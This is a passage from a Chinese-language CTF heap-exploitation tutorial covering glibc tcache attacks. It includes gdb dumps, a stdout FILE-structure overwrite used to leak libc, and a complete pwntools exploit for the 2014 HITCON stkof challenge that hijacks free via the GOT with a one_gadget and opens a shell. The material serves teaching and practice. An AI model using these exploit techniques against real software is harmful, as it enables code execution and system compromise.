0x555d56ed6780: 0x0000000000000000  0x0000000000000000
0x555d56ed6790: 0x0000000000000000  0x0000000000000051   #2
0x555d56ed67a0: 0x0000000000000000  0xdadadadadadadada
...............
0x555d56ed67e0: 0x0000000000000000  0x0000000000000061   #3
0x555d56ed67f0: 0x0000000000000061(&#39;a&#39;) 0x0000000000000000
0x555d56ed6800: 0x0000000000000000  0x0000000000000000
...............
0x555d56ed6830: 0x0000000000000000  0x0000000000000000
0x555d56ed6840: 0x0000000000000000  0x0000000000000071   #4
0x555d56ed6850: 0x4141414141414141  0x4141414141414141
...............
0x555d56ed68b0: 0x0000000000000660  0x0000000000000500   #5
...............
</pre></div>

<ul>
<li>改写文件结构体的相关字段</li>
</ul>
<div class="codehilite"><pre><span></span>    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x9</span><span class="o">+</span><span class="mh">0x34</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x60\x07</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># corrupt the fd</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x3e</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># overwrite the file-structure !!!</span>
</pre></div>

<div class="codehilite"><pre><span></span>gdb-peda$ x/20xg stdout
0x7fa8a0a40760 &lt;_IO_2_1_stdout_&gt;:   0x00000000fbad1800(!!!) 0x0000000000000000(!!!)
0x7fa8a0a40770 &lt;_IO_2_1_stdout_+16&gt;:    0x0000000000000000(!!!) 0x0000000000000000(!!!)
0x7fa8a0a40780 &lt;_IO_2_1_stdout_+32&gt;:    0x00007fa8a0a40700(!!!_IO_write_base)   0x00007fa8a0a407e3
0x7fa8a0a40790 &lt;_IO_2_1_stdout_+48&gt;:    0x00007fa8a0a407e3  0x00007fa8a0a407e3
0x7fa8a0a407a0 &lt;_IO_2_1_stdout_+64&gt;:    0x00007fa8a0a407e4  0x0000000000000000
0x7fa8a0a407b0 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000  0x0000000000000000
0x7fa8a0a407c0 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000  0x00007fa8a0a3fa00
0x7fa8a0a407d0 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001  0xffffffffffffffff
0x7fa8a0a407e0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000  0x00007fa8a0a418c0
0x7fa8a0a407f0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff  0x0000000000000000
gdb-peda$ x/20xg 0x00007fa8a0a40700
0x7fa8a0a40700 &lt;_IO_2_1_stderr_+128&gt;:   0x0000000000000000  0x00007fa8a0a418b0 (leak target)
0x7fa8a0a40710 &lt;_IO_2_1_stderr_+144&gt;:   0xffffffffffffffff  0x0000000000000000
0x7fa8a0a40720 &lt;_IO_2_1_stderr_+160&gt;:   0x00007fa8a0a3f780  0x0000000000000000
</pre></div>

<ul>
<li>文件结构体更改缘由</li>
<li>通过修改 stdout-&gt;_flags 使得程序流能够流到 _IO_do_write (f , f-&gt;_IO_write_base , f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) 这个函数</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">_flags</span> <span class="o">=</span> <span class="mh">0xfbad0000</span>  <span class="c1">// Magic number</span>
<span class="n">_flags</span> <span class="o">&amp;</span> <span class="o">=</span> <span class="o">~</span><span class="n">_IO_NO_WRITES</span> <span class="c1">// _flags = 0xfbad0000</span>
<span class="n">_flags</span> <span class="o">|</span> <span class="o">=</span> <span class="n">_IO_CURRENTLY_PUTTING</span> <span class="c1">// _flags = 0xfbad0800</span>
<span class="n">_flags</span> <span class="o">|</span> <span class="o">=</span> <span class="n">_IO_IS_APPENDING</span> <span class="c1">// _flags = 0xfbad1800</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="kt">int</span>
<span class="nf">_IO_new_file_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span> <span class="cm">/* SET ERROR   !!! key 1 in fact , automatic satisfaction*/</span>
    <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="cm">/* If currently reading or no buffer allocated. */</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
<span class="cm">/* !!! key 2 not into  so f-&gt;_flags fbad1800 or other is ok*/</span>
    <span class="p">{</span>
      <span class="o">:</span>
      <span class="o">:</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>  <span class="c1">// !!! our target</span>
             <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="k">static</span>
<span class="n">_IO_size_t</span>
<span class="nf">new_do_write</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">_IO_size_t</span> <span class="n">to_do</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">_IO_size_t</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>  <span class="cm">/* !!! key3 code flow into if so not into else if */</span>
    <span class="cm">/* On a system without a proper O_APPEND implementation,</span>
<span class="cm">       you would need to sys_seek(0, SEEK_END) here, but is</span>
<span class="cm">       not needed nor desirable for Unix- or Posix-like systems.</span>
<span class="cm">       Instead, just indicate that offset (before and after) is</span>
<span class="cm">       unpredictable. */</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="p">............</span>
    <span class="p">}</span>
  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span> <span class="c1">// Our aim f-&gt;_IO_write_base is data here , so can leak </span>
</pre></div>

<h5 id="challenge-2">Challenge 2 小结<a class="headerlink" href="#challenge-2" title="Permanent link">&para;</a></h5>
<p>这个程序的利用过程是一个应该学会的技巧 ，这种通过文件结构体的方式来实现内存的读写的相关资料可以参考台湾 Angelboy 的博客 。最近的 hctf2018 steak 这个程序的信息泄露多数人是通过 copy puts_addr 到 <code>__free_hook</code> 指针里 ，实现信息泄露 。实际上也可以通过修改文件结构体的字段来实现信息泄露 ，感兴趣的可以试试 。</p>
<h4 id="challenge-3-2014-hitcon-stkof">Challenge 3 : 2014 HITCON stkof<a class="headerlink" href="#challenge-3-2014-hitcon-stkof" title="Permanent link">&para;</a></h4>
<h5 id="_9">基本信息<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h5>
<p>参见<a href="../unlink/#2014 HITCON stkof">unlink HITCON stkof 简介</a></p>
<h5 id="libc-226-tcache">libc 2.26 tcache 利用方法<a class="headerlink" href="#libc-226-tcache" title="Permanent link">&para;</a></h5>
<p>本题可以溢出较长字节，因此可以覆盖 chunk 的 fd 指针，在 libc 2.26 之后的 tcache 机制中，未对 fd 指针指向的 chunk 进行 size 检查，从而可以将 fd 指针覆盖任意地址。在 free 该被溢出 chunk 并且两次 malloc 后可以实现任意地址修改：</p>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">GdbWrapper</span> <span class="kn">import</span> <span class="n">GdbWrapper</span>
<span class="kn">from</span> <span class="nn">one_gadget</span> <span class="kn">import</span> <span class="n">generate_one_gadget</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;info&quot;</span>
<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&quot;little&quot;</span>
<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">64</span>
<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s2">&quot;linux&quot;</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;amd64&quot;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;deepin-terminal&quot;</span><span class="p">,</span> <span class="s2">&quot;-x&quot;</span><span class="p">,</span> <span class="s2">&quot;zsh&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">buf</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">(</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">3</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="k">print</span> <span class="n">tmp</span>
    <span class="k">if</span> <span class="s2">&quot;OK&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">tmp</span> <span class="ow">and</span> <span class="s2">&quot;FAIL&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">tmp</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">poc</span><span class="p">):</span>
    <span class="c1"># test env</span>
    <span class="n">bss_ptrlist</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">free_index</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">free_try</span> <span class="o">=</span> <span class="mi">2</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
    <span class="n">libc_real</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">[:</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
    <span class="k">assert</span> <span class="n">elf</span><span class="o">.</span><span class="n">arch</span> <span class="o">==</span> <span class="s2">&quot;amd64&quot;</span> <span class="ow">and</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">libc_real</span> <span class="o">+</span> <span class="s2">&quot;libc-2.27.so&quot;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">libc_real</span> <span class="o">+</span> <span class="s2">&quot;libc-2.26.so&quot;</span><span class="p">))</span>
    <span class="k">while</span> <span class="n">bss_ptrlist</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
        <span class="c1"># find bss ptr</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
        <span class="n">gdbwrapper</span> <span class="o">=</span> <span class="n">GdbWrapper</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>
        <span class="c1"># gdb.attach(io)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;c&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;d&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">heap</span> <span class="o">=</span> <span class="n">gdbwrapper</span><span class="o">.</span><span class="n">heap</span><span class="p">()</span>
        <span class="n">heap</span> <span class="o">=</span> <span class="p">[(</span><span class="n">k</span><span class="p">,</span> <span class="n">heap</span><span class="p">[</span><span class="n">k</span><span class="p">])</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">heap</span><span class="o">.</span><span class="n">keys</span><span class="p">())]</span>
        <span class="n">ptr_addr</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">index</span> <span class="o">=</span> <span class="mi">1</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">heap</span><span class="p">:</span>
                <span class="n">address</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                <span class="n">info</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                <span class="n">ptr_addr_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">info</span><span class="p">[</span><span class="s2">&quot;mchunk_size&quot;</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffffffe</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x410</span><span class="p">:</span>
                    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">gdbwrapper</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;bytes&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">):</span>
                        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">==</span> <span class="n">x</span><span class="p">[</span><span class="s2">&quot;ADDR&quot;</span><span class="p">]:</span>
                            <span class="n">tmp</span> <span class="o">=</span> <span class="n">gdbwrapper</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;qword&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s2">&quot;ADDR&quot;</span><span class="p">])</span>
                            <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>
                                <span class="k">if</span> <span class="n">binary</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="n">y</span><span class="p">[</span><span class="s2">&quot;PATH&quot;</span><span class="p">]:</span>
                                    <span class="n">ptr_addr</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">y</span><span class="p">[</span><span class="s2">&quot;ADDR&quot;</span><span class="p">])</span>
                                    <span class="k">break</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ptr_addr_length</span><span class="p">):</span>
                            <span class="k">break</span>
                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ptr_addr_length</span><span class="p">:</span>
                    <span class="k">break</span>
            <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">==</span> <span class="mi">5</span><span class="p">):</span>
                <span class="k">break</span>
        <span class="n">bss_ptrlist</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">while</span> <span class="n">free_index</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_try</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_try</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1041</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">))</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
            <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
            <span class="n">free_index</span> <span class="o">=</span> <span class="n">free_try</span>
        <span class="n">free_try</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="c1"># arbitrary write</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span><span class="o">.</span><span class="n">libc</span>
    <span class="n">one_gadget_offsets</span> <span class="o">=</span> <span class="n">generate_one_gadget</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">one_gadget_offset</span> <span class="ow">in</span> <span class="n">one_gadget_offsets</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
        <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
        <span class="n">gdbwrapper</span> <span class="o">=</span> <span class="n">GdbWrapper</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_index</span><span class="p">)</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1041</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_ptrlist</span> <span class="o">-</span> <span class="mh">0x08</span><span class="p">))</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="c1">###leak libc</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;free&quot;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;malloc&quot;</span><span class="p">]))</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]))</span>
        <span class="n">leaked</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">2</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
        <span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;malloc&quot;</span><span class="p">]</span>
        <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
        <span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">one_gadget_offset</span>
        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">))</span>
        <span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">)</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">))</span>
        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">continue</span>
        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./bins/a679df07a8f3a8d590febad45336d031-stkof&quot;</span>
    <span class="n">main</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
</pre></div>

<h3 id="0x06">0x06 建议习题：<a class="headerlink" href="#0x06" title="Permanent link">&para;</a></h3>
<ul>
<li>2018 HITCON children_tcache</li>
